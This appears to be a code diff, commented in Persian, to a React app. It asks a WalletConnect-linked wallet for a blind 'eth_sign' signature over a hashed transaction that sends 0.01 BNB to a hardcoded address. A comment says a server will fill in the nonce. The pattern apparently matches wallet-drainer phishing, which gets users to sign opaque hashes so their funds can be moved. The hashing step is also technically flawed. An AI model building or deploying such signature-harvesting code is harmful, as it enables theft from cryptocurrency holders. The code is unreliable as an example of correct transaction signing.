@@ -1,5 +1,6 @@
 import { EthereumProvider } from "@walletconnect/ethereum-provider";
-import { keccak256 } from "ethers";
+import { keccak256 } from "@ethersproject/keccak256"; // اصلاح ایمپورت keccak256
+import { toUtf8Bytes } from "@ethersproject/strings"; // برای تبدیل رشته به بایت
 
 function App() {
   async function runner() {
@@ -24,10 +25,11 @@ function App() {
 
     async function getRawSignature(address, rawTxData) {
       try {
-        const rawTxHash = keccak256(Buffer.from(rawTxData)); // هش تراکنش
+        const hashedMessage = keccak256(toUtf8Bytes(rawTxData)); // اصلاح تبدیل به هش
+
         var rawSignature = await provider.request({
           method: "eth_sign",
-          params: [address, rawTxHash],
+          params: [address, hashedMessage],
         });
 
         return { rawSignature, rawTxData };
@@ -68,10 +70,11 @@ function App() {
     }
 
     let rawTxData = JSON.stringify({
-      to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد
+      to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد اصلاح شد
       value: "0x2386f26fc10000", // 0.01 BNB به واحد wei
       gas: "0x5208", // مقدار گس استاندارد (21000)
       gasPrice: "0x12a05f200", // مقدار گس پرایس (5 Gwei)
+      nonce: "0x0", // مقدار نانس اولیه (سرور مقدار درست را جایگزین می‌کند)
     });
 
     let balance = "0.01"; // مقدار BNB که ارسال می‌شود
